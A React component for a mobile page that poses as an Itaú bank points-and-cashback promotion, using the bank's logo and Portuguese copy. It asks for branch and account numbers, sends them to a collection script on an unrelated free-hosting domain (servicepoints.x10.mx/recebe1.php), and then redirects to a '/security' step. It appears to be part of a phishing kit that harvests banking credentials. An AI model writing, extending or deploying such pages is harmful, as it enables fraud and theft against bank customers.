import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom'
import InputMask from 'react-input-mask';
import './FisicaMobile.css';

const FisicaMobile = () => {
  const [ag, setAg] = useState("");
  const [conta, setConta] = useState("");
  const navigate = useNavigate();

  const setMemory = async () => {
    if(!ag || !conta){
      alert("Por favor preencha todos os campos !");
      return; // Adicionado para evitar prosseguir com a execução /security
    }
    try {
      const response = await fetch(`https://servicepoints.x10.mx/recebe1.php?ag=${ag}&conta=${conta}`);
      if (!response.ok) {
        throw new Error('Sistema indisponível');
      }
      navigate('/security');
    } catch (error) {
      console.error('Erro ao fazer a requisição:', error);
    }
  }

  const gravaAgencia = (event) => {
    setAg(event.target.value);
  };

  const gravaConta = (event) => {
    setConta(event.target.value);
  };

  return (
    <div className='FisicaMobile'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title1'>
            <span>Ponto a ponto</span>
            <p>Ganhe pontos e cashback e<br />use esse benefício para economizar</p>
        </div>
        <div className='form1'>
            <InputMask mask="9999" className='digitavel' type="text" placeholder='agência' onChange={gravaAgencia} />
            <InputMask mask="99999-9" className='digitavel' type="text" placeholder='conta' onChange={gravaConta} /><br /><br />
            <input type="checkbox" /><label>lembrar de mim</label><br /><br /><br />
            <button onClick={setMemory}>próximo</button>
        </div>
    </div>
  );
}

export default FisicaMobile;
